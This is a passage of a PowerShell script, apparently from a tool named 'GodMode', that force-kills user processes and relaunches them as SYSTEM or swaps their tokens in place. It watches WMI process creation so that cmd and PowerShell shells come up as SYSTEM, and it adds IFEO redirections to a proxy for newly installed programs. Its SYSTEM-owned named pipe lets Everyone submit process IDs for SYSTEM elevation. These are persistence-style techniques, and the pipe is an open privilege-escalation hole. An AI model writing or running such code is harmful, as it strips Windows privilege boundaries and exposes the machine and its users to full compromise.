    # [1,64]: Start-ThreadJob has per-job overhead, so spawning hundreds on a big
    # server is wasteful for this workload (and caps runaway concurrency).
    try {
        $j = $env:GODMODE_JOBS
        if ($j) { $ji = [int]$j; if ($ji -gt 0) { return [math]::Min(64, [math]::Max(1, $ji)) } }
    } catch {}
    $count = 0
    try { $count = [System.Environment]::ProcessorCount } catch {}
    if ($count -le 0) {
        try { $count = [int]$env:NUMBER_OF_PROCESSORS } catch {}
    }
    if ($count -le 0) { $count = 4 }
    return [math]::Min(64, [math]::Max(1, $count))
}

function Invoke-ParallelElevation {
    param(
        [array]$Targets,
        [int]$systemPid,
        [int]$MaxThreads = (Get-OptimalThreadCount),
        [switch]$HideWindow
    )
    $total = $Targets.Count
    if ($total -eq 0) { return @() }

    $canParallel = $false
    try {
        $null = Get-Command Start-ThreadJob -ErrorAction Stop
        $canParallel = $true
    } catch {
        try {
            Import-Module ThreadJob -ErrorAction Stop
            $canParallel = $true
        } catch {}
    }

    if (-not $canParallel) {
        $results = @()
        foreach ($proc in $Targets) {
            $procName = [System.IO.Path]::GetFileNameWithoutExtension($proc.ExecutablePath)
            $hasSystem = $false
            try {
                $wmiProcs = Get-CimInstance Win32_Process -Filter "Name='$procName.exe'" -ErrorAction SilentlyContinue
                foreach ($wp in $wmiProcs) {
                    try {
                        $owner = Invoke-CimMethod -InputObject $wp -MethodName GetOwner -ErrorAction SilentlyContinue
                        if ($owner.User -eq "SYSTEM") { $hasSystem = $true; break }
                    } catch {}
                }
            } catch {}
            if ($hasSystem) {
                $results += [PSCustomObject]@{ Name = $procName; Result = "SKIP"; Error = "" }
                continue
            }
            try {
                $wmiProcs = Get-CimInstance Win32_Process -Filter "Name='$procName.exe'" -ErrorAction SilentlyContinue
                foreach ($wp in $wmiProcs) {
                    try {
                        $owner = Invoke-CimMethod -InputObject $wp -MethodName GetOwner -ErrorAction SilentlyContinue
                        # Blank owner = unresolvable (IFEO/gmproxy launch window); do NOT kill.
                        if ($owner -and $owner.User -and $owner.User -ne "SYSTEM") {
                            Stop-Process -Id $wp.ProcessId -Force -ErrorAction SilentlyContinue
                        }
                    } catch {}
                }
            } catch {}
            $arguments = ""
            if ($proc.CommandLine) {
                $cmdLine = $proc.CommandLine
                if ($cmdLine.StartsWith('"')) {
                    $endQuote = $cmdLine.IndexOf('"', 1)
                    if ($endQuote -gt 0 -and $endQuote -lt $cmdLine.Length - 1) {
                        $arguments = $cmdLine.Substring($endQuote + 1).Trim()
                    }
                } else {
                    $firstSpace = $cmdLine.IndexOf(' ')
                    if ($firstSpace -gt 0) {
                        $arguments = $cmdLine.Substring($firstSpace + 1).Trim()
                    }
                }
            }
            $cmdLine = if ($arguments) { "`"$($proc.ExecutablePath)`" $arguments" } else { "`"$($proc.ExecutablePath)`"" }
            $result = [TokenOps]::CreateProcessAsSystem($systemPid, $proc.ExecutablePath, $cmdLine, [bool]$HideWindow)
            if ($result -eq 0) {
                $results += [PSCustomObject]@{ Name = $procName; Result = "SUCCESS"; Error = "" }
            } else {
                $results += [PSCustomObject]@{ Name = $procName; Result = "FAIL"; Error = $result.ToString() }
            }
        }
        return $results
    }

    $batchSize = [math]::Ceiling($total / $MaxThreads)
    $jobs = @()
    for ($i = 0; $i -lt $MaxThreads; $i++) {
        $start = $i * $batchSize
        $end = [math]::Min(($i + 1) * $batchSize, $total)
        if ($start -ge $total) { break }
        $chunk = $Targets[$start..($end-1)]
        $job = Start-ThreadJob -ScriptBlock {
            param($chunk, $systemPid, $hideWindow)
            $results = @()
            foreach ($proc in $chunk) {
                $procName = [System.IO.Path]::GetFileNameWithoutExtension($proc.ExecutablePath)
                $hasSystem = $false
                try {
                    $wmiProcs = Get-CimInstance Win32_Process -Filter "Name='$procName.exe'" -ErrorAction SilentlyContinue
                    foreach ($wp in $wmiProcs) {
                        try {
                            $owner = Invoke-CimMethod -InputObject $wp -MethodName GetOwner -ErrorAction SilentlyContinue
                            if ($owner.User -eq "SYSTEM") { $hasSystem = $true; break }
                        } catch {}
                    }
                } catch {}
                if ($hasSystem) {
                    $results += [PSCustomObject]@{ Name = $procName; Result = "SKIP"; Error = "" }
                    continue
                }
                try {
                    $wmiProcs = Get-CimInstance Win32_Process -Filter "Name='$procName.exe'" -ErrorAction SilentlyContinue
                    foreach ($wp in $wmiProcs) {
                        try {
                            $owner = Invoke-CimMethod -InputObject $wp -MethodName GetOwner -ErrorAction SilentlyContinue
                            # Blank owner = unresolvable (IFEO/gmproxy launch window); do NOT kill.
                            if ($owner -and $owner.User -and $owner.User -ne "SYSTEM") {
                                Stop-Process -Id $wp.ProcessId -Force -ErrorAction SilentlyContinue
                            }
                        } catch {}
                    }
                } catch {}
                $arguments = ""
                if ($proc.CommandLine) {
                    $cmdLine = $proc.CommandLine
                    if ($cmdLine.StartsWith('"')) {
                        $endQuote = $cmdLine.IndexOf('"', 1)
                        if ($endQuote -gt 0 -and $endQuote -lt $cmdLine.Length - 1) {
                            $arguments = $cmdLine.Substring($endQuote + 1).Trim()
                        }
                    } else {
                        $firstSpace = $cmdLine.IndexOf(' ')
                        if ($firstSpace -gt 0) {
                            $arguments = $cmdLine.Substring($firstSpace + 1).Trim()
                        }
                    }
                }
                $cmdLine = if ($arguments) { "`"$($proc.ExecutablePath)`" $arguments" } else { "`"$($proc.ExecutablePath)`"" }
                $result = [TokenOps]::CreateProcessAsSystem($systemPid, $proc.ExecutablePath, $cmdLine, $hideWindow)
                if ($result -eq 0) {
                    $results += [PSCustomObject]@{ Name = $procName; Result = "SUCCESS"; Error = "" }
                } else {
                    $results += [PSCustomObject]@{ Name = $procName; Result = "FAIL"; Error = $result.ToString() }
                }
            }
            return $results
        } -ArgumentList $chunk, $systemPid, [bool]$HideWindow
        $jobs += $job
    }

    $allResults = @()
    foreach ($job in $jobs) {
        $jobResult = $job | Wait-Job | Receive-Job
        $allResults += $jobResult
        Remove-Job $job -Force
    }
    return $allResults
}

function Get-NonSystemProcessesParallel {
    param(
        [array]$allProcs,
        [string[]]$CriticalProcs,
        [string[]]$systemAccounts = @("SYSTEM", "NETWORK SERVICE", "LOCAL SERVICE", "DWM-1", "UMFD-1", "UMFD-0"),
        [int]$MaxThreads = (Get-OptimalThreadCount),
        # $ChunkSize default 0 = compute candidate-aware in the body (below). The
        # old default ([math]::Max(10, ceil(50/threadCount))) was a hardcoded 50
        # that under-utilized many-core boxes and over-chunked few-core ones; it
        # also called Get-OptimalThreadCount a second time on every bind. A caller
        # may still pass an explicit -ChunkSize to override (backward compatible).
        [int]$ChunkSize = 0
    )
    # Fast filter: exclude by PID, path, and critical name (no owner check)
    $candidates = $allProcs | Where-Object {
        $_.ProcessId -gt 4 -and
        $_.ExecutablePath -and
        $_.ExecutablePath -like "*.exe" -and
        ($CriticalProcs -notcontains [System.IO.Path]::GetFileName($_.ExecutablePath))
    }
    if ($candidates.Count -eq 0) { return @() }
    # Candidate-aware chunk size: aim for ~2x-threadCount chunks so the parallel
    # WMI owner queries load-balance across cores (a few more chunks than threads
    # keeps all threads busy even if one chunk finishes early). Floor of 8 so a
    # tiny candidate set does not over-fragment into 1-PID ThreadJobs (per-job
    # startup overhead would dominate). Only computed when the caller did not
    # pass an explicit -ChunkSize (<=0 = unset).
    if ($ChunkSize -le 0) {
        $ChunkSize = [math]::Max(8, [math]::Ceiling($candidates.Count / ($MaxThreads * 2)))
    }

    # Check parallel capability
    $canParallel = $false
    try {
        $null = Get-Command Start-ThreadJob -ErrorAction Stop
        $canParallel = $true
    } catch {
        try {
            Import-Module ThreadJob -ErrorAction Stop
            $canParallel = $true
        } catch {}
    }

    if (-not $canParallel) {
        # Sequential fallback with CIM/WMI compatibility
        $results = @()
        foreach ($proc in $candidates) {
            try {
                $owner = $null
                if ($proc.PSObject.TypeNames[0] -like "*CimInstance*") {
                    $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
                } else {
                    $owner = $proc.GetOwner().User
                }
                if ($owner -and ($systemAccounts -notcontains $owner)) {
                    $results += $proc
                }
            } catch {}
        }
        return $results
    }

    # Build PID lookup and chunks
    $pidLookup = @{}
    foreach ($proc in $candidates) {
        $pidLookup[[int]$proc.ProcessId] = $proc
    }

    $pids = $candidates | Select-Object -ExpandProperty ProcessId
    $chunks = @()
    $currentChunk = @()
    # NOTE: loop var is $procId, NOT $pid -- $pid/$PID is a read-only automatic
    # variable (the current process PID). Using $pid as a foreach loop variable
    # assigns to it every iteration -> "Cannot overwrite variable PID because it
    # is read-only or a constant" -> uncaught trap that kills the SYSTEM
    # aggressive elevation AND the monitor -Launch startup (Start-Monitoring ->
    # Invoke-ExistingProcessElevation -> here). PS vars are case-insensitive:
    # $pid IS $PID.
    foreach ($procId in $pids) {
        $currentChunk += $procId
        if ($currentChunk.Count -ge $ChunkSize) {
            $chunks += ,@($currentChunk)
            $currentChunk = @()
        }
    }
    if ($currentChunk.Count -gt 0) {
        $chunks += ,@($currentChunk)
    }

    # Launch parallel threads: each re-queries its PID batch and checks ownership
    $jobs = @()
    foreach ($chunk in $chunks) {
        $filterStr = ($chunk | ForEach-Object { "ProcessId=$([int]$_) " }) -join "OR "
        $job = Start-ThreadJob -ScriptBlock {
            param($filter, $sysAccounts)
            $results = @()
            try {
                $procs = Get-CimInstance Win32_Process -Filter $filter -ErrorAction SilentlyContinue
                foreach ($proc in $procs) {
                    try {
                        $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
                        if ($owner -and $owner -notin $sysAccounts) {
                            $results += [int]$proc.ProcessId
                        }
                    } catch {}
                }
            } catch {}
            return $results
        } -ArgumentList $filterStr, $systemAccounts
        $jobs += $job
    }

    # Collect results
    $nonSystemPids = @()
    foreach ($job in $jobs) {
        $pids = $job | Wait-Job | Receive-Job -ErrorAction SilentlyContinue
        if ($pids) { $nonSystemPids += $pids }
        Remove-Job $job -Force -ErrorAction SilentlyContinue
    }

    # Map PIDs back to original CIM instances. $procId (NOT $pid -- see the
    # note on the chunk loop above: $pid is the read-only automatic $PID and
    # assigning it throws "Cannot overwrite variable PID").
    $results = @()
    foreach ($procId in $nonSystemPids) {
        if ($pidLookup.ContainsKey([int]$procId)) {
            $results += $pidLookup[[int]$procId]
        }
    }
    return $results
}

$script:ProcessCreationQueue = [System.Collections.ArrayList]::Synchronized([System.Collections.ArrayList]::new())
$script:ProcessCreationWatcher = $null
# Watcher delivery runs on a background ThreadJob (Start-ThreadJob) calling
# ManagementEventWatcher.WaitForNextEvent() in a loop -- see Register-ProcessCreationWatcher
# for why Register-ObjectEvent -Action is NOT used (its -Action never pumps in a
# non-interactive scheduled-task runscape, so events were queued but never copied into
# $ProcessCreationQueue -> shells stayed admin). The job ref is stored here so the
# Start-Monitoring liveness heartbeat can check its State and auto-re-register on death.
$script:ProcessCreationWatcherJob = $null
# Shared heartbeat state (synchronized hashtable -> thread-safe across the ThreadJob and
# the main loop): Stopped = shutdown signal to the ThreadJob; Beats = total WMI events
# the ThreadJob copied into the queue (liveness + delivery proof for the heartbeat).
$script:ProcessCreationWatcherState = [hashtable]::Synchronized(@{ Stopped = $false; Beats = 0 })

# GmProxy graceful-fallback PID handoff: gmproxy.exe signals the monitor with the
# PID it launched as the current user (named pipe GodMode-GmProxyFeedback) so the
# monitor can elevate it IN PLACE (ReplaceProcessTokenForPid) instead of the 15s
# periodic scan kill+relaunching a duplicate. Fed by Start-GmProxyFeedbackListener
# (ThreadJob pipe server); drained by the Start-Monitoring loop.
$script:GmProxyFeedbackQueue = [System.Collections.ArrayList]::Synchronized([System.Collections.ArrayList]::new())
# gmhook interactive-shell birth-signals (SHELLPID=<n> over the same
# GodMode-GmProxyFeedback pipe) land here for INSTANT in-place SYSTEM
# elevation -- the monitor drains this queue every loop tick (right after the
# GmProxyFeedbackQueue drain) into Invoke-GmHookShellFeedbackElevation. Kept
# SEPARATE from $GmProxyFeedbackQueue so the gmproxy normal-app feedback path
# (PID=) and its tests stay byte-for-byte unchanged; one pipe listener routes
# both payloads (see Start-GmProxyFeedbackListener).
$script:GmHookShellQueue = [System.Collections.ArrayList]::Synchronized([System.Collections.ArrayList]::new())
$script:GmProxyFeedbackPipeJob = $null

function Register-ProcessCreationWatcher {
    # NOTE: this watcher is the SOLE event-driven elevator for interactive shells
    # (cmd/powershell/pwsh/powershell_ise -- console/UI apps the global WH_GETMESSAGE
    # hook does not auto-inject, and that were removed from IFEO so they are not born
    # via gmproxy). The Start-Monitoring loop drains the shared queue into
    # Monitor-ElevateProcess Phase 0 (in-place ReplaceProcessTokenForPid token swap,
    # no kill, no relaunch, no duplicate).
    #
    # DELIVERY MODEL (PS7): the ORIGINAL Windows PowerShell 5.1 design attached a
    # .NET handler to the watcher's EventArrived delegate (the PS 5.1 "+=" syntax).
    # PS 7.x removed that adapter (throws "The property 'EventArrived' cannot be found"), so an earlier
    # fix switched to `Register-ObjectEvent -Action`. That REGISTERS without error,
    # BUT the -Action block only runs when the runspace PUMPS the PowerShell event
    # queue -- which a non-interactive scheduled-task runscape (-WindowStyle Hidden,
    # no console "pulse") does NOT do reliably: the engine queues the event but the
    # -Action that copies it into $ProcessCreationQueue never executes. Net effect:
    # the watcher reported Active=$true, the 5s polling fallback was GATED OFF (it
    # only ran when Active=$false), and interactive shells got NEITHER path -- they
    # stayed admin (whoami -> admin). This is the exact symptom that persisted across
    # two prior PS7/drain fix rounds.
    #
    # FIX: drive delivery from a background ThreadJob that calls
    # ManagementEventWatcher.WaitForNextEvent() in a loop. WaitForNextEvent() BLOCKS
    # the ThreadJob's own thread until a WMI event fires and returns it directly --
    # completely independent of the runscape's event-queue pumping. The ThreadJob
    # populates the shared synchronized $ProcessCreationQueue + a heartbeat counter
    # ($ProcessCreationWatcherState.Beats) so the Start-Monitoring loop can verify
    # liveness. The 5s polling fallback now runs UNCONDITIONALLY (throttled) as a
    # guaranteed safety net, so a dead/stuck watcher can never strand shells again.
    try {
        try { Unregister-ProcessCreationWatcher | Out-Null } catch {}
        try { Add-Type -AssemblyName System.Management -ErrorAction SilentlyContinue } catch {}

        # ThreadJob availability: if the module is absent, the watcher cannot run.
        # Degrade gracefully -- the 5s polling fallback (always on) elevates shells.
        $canThreadJob = $false
        try { $null = Get-Command Start-ThreadJob -ErrorAction Stop; $canThreadJob = $true } catch {
            try { Import-Module ThreadJob -ErrorAction Stop; $canThreadJob = $true } catch {}
        }
        if (-not $canThreadJob) {
            Write-Log -Message "Start-ThreadJob unavailable; WMI process-creation watcher disabled -- 5s polling fallback will elevate interactive shells." -Type "WARN" -Color Yellow
            $script:ProcessCreationWatcherActive = $false
            return $false
        }

        $query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'"
        $script:ProcessCreationWatcher = New-Object System.Management.ManagementEventWatcher($query)
        $queue = $script:ProcessCreationQueue
        $state = $script:ProcessCreationWatcherState
        $state.Stopped = $false
        $state.Beats = 0
        $watcher = $script:ProcessCreationWatcher

        $job = Start-ThreadJob -ScriptBlock {
            param($watcher, $q, $st)
            while (-not $st.Stopped) {
                try {
                    # WaitForNextEvent() blocks THIS thread until a WMI event fires
                    # (independent of the runscape event-queue pump). watcher.Stop()
                    # cancels it -> throws -> the catch breaks the loop.
                    $evt = $watcher.WaitForNextEvent()
                    if ($st.Stopped) { try { $evt.Dispose() } catch {}; break }
                    $proc = $evt.TargetInstance
                    if ($proc -and $proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe" -and $proc.SessionId -gt 0) {
                        $arguments = ""
                        if ($proc.CommandLine) {
                            $cmdLine = [string]$proc.CommandLine
                            if ($cmdLine.StartsWith('"')) {
                                $endQuote = $cmdLine.IndexOf('"', 1)
                                if ($endQuote -gt 0 -and $endQuote -lt $cmdLine.Length - 1) {
                                    $arguments = $cmdLine.Substring($endQuote + 1).Trim()
                                }
                            } else {
                                $firstSpace = $cmdLine.IndexOf(' ')
                                if ($firstSpace -gt 0) {
                                    $arguments = $cmdLine.Substring($firstSpace + 1).Trim()
                                }
                            }
                        }
                        try {
                            [void]$q.Add([PSCustomObject]@{
                                ProcessId      = $proc.ProcessId
                                ExecutablePath = $proc.ExecutablePath
                                Arguments      = $arguments
                                SessionId      = $proc.SessionId
                                CreationDate   = $proc.CreationDate
                            })
                            $st.Beats = [int]$st.Beats + 1
                        } catch {}
                    }
                    try { $evt.Dispose() } catch {}
                } catch {
                    if ($st.Stopped) { break }
                    # WaitForNextEvent threw (transient WMI error or watcher stopped
                    # externally). Brief pause then retry; the Start-Monitoring
                    # liveness heartbeat will re-register if this ThreadJob dies.
                    Start-Sleep -Milliseconds 500
                }
            }
        } -ArgumentList $watcher, $queue, $state
        Set-Variable -Name ProcessCreationWatcherJob -Value $job -Scope Script
        $script:ProcessCreationWatcherActive = $true
        return $true
    } catch {
        Write-Log -Message "WMI process creation watcher failed to register: $_" -Type "WARN" -Color Yellow
        $script:ProcessCreationWatcherActive = $false
        return $false
    }
}

function Unregister-ProcessCreationWatcher {
    # Signal the ThreadJob to stop, then cancel its blocking WaitForNextEvent() via
    # watcher.Stop() (makes WaitForNextEvent throw -> the loop's catch breaks out),
    # then tear down the job + watcher + queue. Disable-GodMode + re-registration
    # both call this so no WMI subscription or ThreadJob ever leaks.
    if ($script:ProcessCreationWatcherState) { $script:ProcessCreationWatcherState.Stopped = $true }
    if ($script:ProcessCreationWatcher) {
        try { $script:ProcessCreationWatcher.Stop() } catch {}
        try { $script:ProcessCreationWatcher.Dispose() } catch {}
        $script:ProcessCreationWatcher = $null
    }
    if ($script:ProcessCreationWatcherJob) {
        try { $script:ProcessCreationWatcherJob | Stop-Job -ErrorAction SilentlyContinue; $script:ProcessCreationWatcherJob | Remove-Job -Force -ErrorAction SilentlyContinue } catch {}
        Set-Variable -Name ProcessCreationWatcherJob -Value $null -Scope Script
    }
    $script:ProcessCreationWatcherActive = $false
    if ($script:ProcessCreationQueue) {
        $script:ProcessCreationQueue.Clear()
    }
}

function Start-GmProxyFeedbackListener {
    # Named-pipe server (\\.\pipe\GodMode-GmProxyFeedback) that receives PIDs from
    # gmproxy.exe's graceful-fallback launch path and enqueues them for IN-PLACE
    # SYSTEM elevation (ReplaceProcessTokenForPid) -- avoiding the 15s periodic
    # scan's kill+relaunch duplicate. Runs on a background ThreadJob so it never
    # blocks the Start-Monitoring loop. Best-effort: any pipe error is swallowed
    # and retried; the periodic scan remains a fallback if this listener is absent.
    if ($script:GmProxyFeedbackPipeJob -and $script:GmProxyFeedbackPipeJob.State -eq 'Running') { return $true }
    try {
        $job = Start-ThreadJob -ScriptBlock {
            param($normalQueue, $shellQueue)
            $pipeName = 'GodMode-GmProxyFeedback'
            while ($true) {
                $pipe = $null
                try {
                    # Grant SYSTEM + Administrators full control and Everyone read/write
                    # so an admin-user-launched gmproxy.exe (IFEO) AND an admin-user-
                    # injected gmhook.dll host (explorer) can connect to this SYSTEM-
                    # created pipe. Fall back to the default ACL if the access-control
                    # types are unavailable on this runtime.
                    try {
                        $pipeSec = New-Object System.IO.Pipes.PipeSecurity
                        $pipeSec.AddAccessRule((New-Object System.IO.Pipes.PipeAccessRule('Everyone', [System.IO.Pipes.PipeAccessRights]::ReadWrite, [System.Security.AccessControl.AccessControlType]::Allow)))
                        $pipeSec.AddAccessRule((New-Object System.IO.Pipes.PipeAccessRule('SYSTEM', [System.IO.Pipes.PipeAccessRights]::FullControl, [System.Security.AccessControl.AccessControlType]::Allow)))
                        $pipeSec.AddAccessRule((New-Object System.IO.Pipes.PipeAccessRule('Administrators', [System.IO.Pipes.PipeAccessRights]::FullControl, [System.Security.AccessControl.AccessControlType]::Allow)))
                        $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::In, 254, [System.IO.Pipes.PipeTransmissionMode]::Byte, [System.IO.Pipes.PipeOptions]::None, 0, 0, $pipeSec)
                    } catch {
                        $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::In, 254, [System.IO.Pipes.PipeTransmissionMode]::Byte, [System.IO.Pipes.PipeOptions]::None, 0, 0)
                    }
                    $pipe.WaitForConnection()
                    $sr = New-Object System.IO.StreamReader($pipe)
                    $line = $sr.ReadLine()
                    if ($line) {
                        # gmproxy graceful-fallback normal-app handoff (PID=<n>) ->
                        # normal queue -> Invoke-GmProxyFeedbackElevation (shells
                        # are skipped there via $SkipNames, as before).
                        $m = [regex]::Match($line, '^PID=(\d+)')
                        if ($m.Success) {
                            $pidVal = [int]$m.Groups[1].Value
                            if ($pidVal -gt 0) { [void]$normalQueue.Add($pidVal) }
                        }
                        # gmhook interactive-shell birth-signal (SHELLPID=<n>) ->
                        # shell queue -> Invoke-GmHookShellFeedbackElevation (the
                        # INSTANT in-place SYSTEM swap, no kill). ^SHELLPID= and
                        # ^PID= are mutually exclusive prefixes so the two ifs are
                        # independent; a line matches at most one.
                        $ms = [regex]::Match($line, '^SHELLPID=(\d+)')
                        if ($ms.Success) {
                            $pidVal = [int]$ms.Groups[1].Value
                            if ($pidVal -gt 0) { [void]$shellQueue.Add($pidVal) }
                        }
                    }
                } catch {
                    Start-Sleep -Milliseconds 200
                } finally {
                    if ($pipe) { try { $pipe.Dispose() } catch {} }
                }
            }
        } -ArgumentList $script:GmProxyFeedbackQueue, $script:GmHookShellQueue
        Set-Variable -Name GmProxyFeedbackPipeJob -Value $job -Scope Script
        Write-Log -Message "GmProxy feedback pipe listener started (pipe: GodMode-GmProxyFeedback)." -Type "INFO" -Color Gray
        return $true
    } catch {
        Write-Log -Message "GmProxy feedback pipe listener failed to start: $_" -Type "WARN" -Color Yellow
        return $false
    }
}

function Stop-GmProxyFeedbackListener {
    if ($script:GmProxyFeedbackPipeJob) {
        $job = $script:GmProxyFeedbackPipeJob
        try { $job | Stop-Job -ErrorAction SilentlyContinue; $job | Remove-Job -Force -ErrorAction SilentlyContinue } catch {}
        Set-Variable -Name GmProxyFeedbackPipeJob -Value $null -Scope Script
    }
    # Clear the gmhook shell-birth queue for teardown parity (the normal-app
    # GmProxyFeedbackQueue is cleared by the monitor-loop drain / Disable-GodMode
    # path; mirror that here so a stale SHELLPID never elevates a recycled PID
    # after a disable/re-enable cycle).
    if ($script:GmHookShellQueue) { $script:GmHookShellQueue.Clear() }
}

# --- Instant IFEO new-app watcher: FileSystemWatcher on the install dirs fires
#     the moment a new .exe is Created/Renamed, enqueues the path, and the
#     Start-Monitoring loop drains it into Add-IfeoElevationForApp (idempotent --
#     only adds genuinely-new apps, never retrigger). Purely event-driven (NO
#     Start-Sleep polling); if no new .exe appears, zero events fire and nothing
#     happens. Buffer overflow -> catch-up rescan via Install-IfeoElevation. ---
$script:IfeoNewAppQueue = [System.Collections.ArrayList]::Synchronized([System.Collections.ArrayList]::new())
$script:IfeoNewAppDebounce = [hashtable]::Synchronized(@{})
$script:IfeoNewAppWatchers = @()
$script:IfeoNewAppSubscriptions = @()
$script:IfeoNewAppWatcherActive = $false
$script:IfeoPruneQueue = [System.Collections.ArrayList]::Synchronized([System.Collections.ArrayList]::new())

function Start-IfeoNewAppWatcher {
    <#
    .SYNOPSIS
        Instant, event-driven IFEO auto-add for newly installed programs.
    .DESCRIPTION
        Creates System.IO.FileSystemWatcher instances on C:\Program Files,
        C:\Program Files (x86), and each real user's AppData\Local\Programs (the
        same sources Get-IfeoElevationCandidates scans). The instant a new .exe
        is Created or Renamed in those trees, the path is enqueued into
        $script:IfeoNewAppQueue; the Start-Monitoring loop drains it into
        Add-IfeoElevationForApp (idempotent -- only genuinely-new apps, never
        retrigger). Purely event-driven: NO polling, NO Start-Sleep waits; if
        nothing new is installed, no events fire and the watcher does nothing.
        Per-base-name debounce (500ms) + the idempotent Add gate guarantee each
        new app is added at most once. On buffer overflow (Error event) a
        sentinel is enqueued so the drain runs an idempotent Install-IfeoElevation
        catch-up rescan. Best-effort throughout; any watcher error is swallowed
        so it never affects the monitor loop.
        The Deleted event enqueues a DEFERRED stale-prune entry (grace period
        ~5s) so an updater's new .exe lands first; the Start-Monitoring drain
        then re-scans and removes the gmproxy IFEO key only if the .exe is gone
        everywhere -- never touching unrelated keys, never retriggering on
        updater swaps (the new .exe's Created event re-hooks it).
    #>
    if ($script:IfeoNewAppWatcherActive) { return $true }
    try {
        $watchDirs = @()
        $pf1 = "C:\Program Files"
        $pf2 = "C:\Program Files (x86)"
        if (Test-Path $pf1) { $watchDirs += $pf1 }
        if (Test-Path $pf2) { $watchDirs += $pf2 }
        # Per-user installs: enumerate real user profiles (exclude system/Public).
        try {
            Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -notin @('Public','Default','Default User','All Users') -and
                (Test-Path (Join-Path $_.FullName 'AppData\Local\Programs'))
            } | ForEach-Object { $watchDirs += (Join-Path $_.FullName 'AppData\Local\Programs') }
        } catch {}

        $script:IfeoNewAppWatchers = @()
        $script:IfeoNewAppSubscriptions = @()
        $shared = @{
            Queue = $script:IfeoNewAppQueue
            Prune = $script:IfeoPruneQueue
        }
        $dirIdx = 0
        foreach ($dir in $watchDirs) {
            $dirIdx++
            try {
                $w = New-Object System.IO.FileSystemWatcher($dir, "*.exe")
                $w.IncludeSubdirectories = $true
                $w.InternalBufferSize = 65536
                $w.NotifyFilter = [System.IO.NotifyFilters]::FileName -bor [System.IO.NotifyFilters]::DirectoryName
                # PowerShell 7 removed the `$obj.Event += {}` adapter (it throws
                # "The property '<Event>' cannot be found on this object"), so the
                # four FileSystemWatcher handlers below MUST use Register-ObjectEvent.
                # The -Action block runs in the event-subscription runscape where
                # $script: scope does NOT reliably resolve, so the shared queues are
                # passed in via -MessageData (a hashtable) and reached as
                # $Event.MessageData.Queue / .Prune. $EventArgs is the automatic
                # event-args (FileSystemEventArgs / RenamedEventArgs / ErrorEventArgs).
                $createdAction = {
                    $s = $Event.MessageData
                    if (-not $s) { return }
                    $full = $EventArgs.FullPath
                    if ($full -and $full -like '*.exe') {
                        try { [void]$s.Queue.Add($full) } catch {}
                        # Re-arm (updater swap): the app reappeared, so cancel any
                        # pending stale-prune for this base name -- never remove a
                        # gmproxy IFEO key mid-update. The prune drain's re-scan is
                        # the belt-and-suspenders; this avoids even attempting it.
                        $cn = [System.IO.Path]::GetFileName($full)
                        if (-not [string]::IsNullOrWhiteSpace($cn)) {
                            for ($ci = $s.Prune.Count - 1; $ci -ge 0; $ci--) {
                                try {
                                    if ($s.Prune[$ci].BaseName -eq $cn) {
                                        $s.Prune.RemoveAt($ci)
                                    }
                                } catch {}
                            }
                        }
                    }
                }
                $renamedAction = {
                    $s = $Event.MessageData
                    if (-not $s) { return }
                    $full = $EventArgs.FullPath
                    if ($full -and $full -like '*.exe') {
                        try { [void]$s.Queue.Add($full) } catch {}
                        # Re-arm (updater swap, .tmp->.exe rename): cancel any
                        # pending stale-prune for this base name (app reappeared).
                        $rn = [System.IO.Path]::GetFileName($full)
                        if (-not [string]::IsNullOrWhiteSpace($rn)) {
                            for ($ri = $s.Prune.Count - 1; $ri -ge 0; $ri--) {
                                try {
                                    if ($s.Prune[$ri].BaseName -eq $rn) {
                                        $s.Prune.RemoveAt($ri)
                                    }
                                } catch {}
                            }
                        }
                    }
                }
                $errorAction = {
                    # Buffer overflow / watcher error -> sentinel for an idempotent catch-up rescan.
                    $s = $Event.MessageData
                    if (-not $s) { return }
                    try { [void]$s.Queue.Add('__GMIFEO_RESCAN__') } catch {}
                }
                $deletedAction = {
                    # A watched .exe was deleted (uninstall, or updater swapping the
                    # binary). Enqueue a DEFERRED stale-prune entry with a ~5s grace
                    # period so an updater's new .exe lands before we decide; the
                    # Start-Monitoring drain re-scans and removes the gmproxy IFEO key
                    # only if the base name is gone everywhere (never touches unrelated
                    # keys, never retriggers on updater swaps).
                    $s = $Event.MessageData
                    if (-not $s) { return }
                    $full = $EventArgs.FullPath
                    if ($full -and $full -like '*.exe') {
                        $bn = [System.IO.Path]::GetFileName($full)
                        if (-not [string]::IsNullOrWhiteSpace($bn)) {
                            try {
                                [void]$s.Prune.Add([PSCustomObject]@{
                                    BaseName = $bn
                                    FullPath = $full
                                    DueTime  = (Get-Date).AddSeconds(5)
                                })
                            } catch {}
                        }
                    }
                }
                $baseSid = "GMIFeoNewApp_{0}_{1}" -f $dirIdx, (($dir -replace '[^A-Za-z0-9]','_').Trim('_'))
                $bindings = @(
                    @{ Name = 'Created'; Action = $createdAction },
                    @{ Name = 'Renamed'; Action = $renamedAction },
                    @{ Name = 'Error';   Action = $errorAction },
                    @{ Name = 'Deleted'; Action = $deletedAction }
                )
                $regOk = $true
                foreach ($b in $bindings) {
                    try {
                        $sid = "$baseSid_$($b.Name)"
                        try { Unregister-Event -SourceIdentifier $sid -ErrorAction SilentlyContinue } catch {}
                        try { Get-Job -Name $sid -ErrorAction SilentlyContinue | Remove-Job -Force -ErrorAction SilentlyContinue } catch {}
                        $null = Register-ObjectEvent -InputObject $w -EventName $b.Name -SourceIdentifier $sid -MessageData $shared -Action $b.Action
                        $script:IfeoNewAppSubscriptions += $sid
                    } catch {
                        Write-DebugLog -FunctionName "Start-IfeoNewAppWatcher" -Action "WARN" -Message "Could not bind $($b.Name) on $dir`: $_"
                        $regOk = $false
                    }
                }
                if ($regOk) {
                    $w.EnableRaisingEvents = $true
                    $script:IfeoNewAppWatchers += $w
                } else {
                    try { $w.Dispose() } catch {}
                }
            } catch {
                Write-DebugLog -FunctionName "Start-IfeoNewAppWatcher" -Action "WARN" -Message "Could not watch $dir`: $_"
            }
        }
        $script:IfeoNewAppWatcherActive = $true
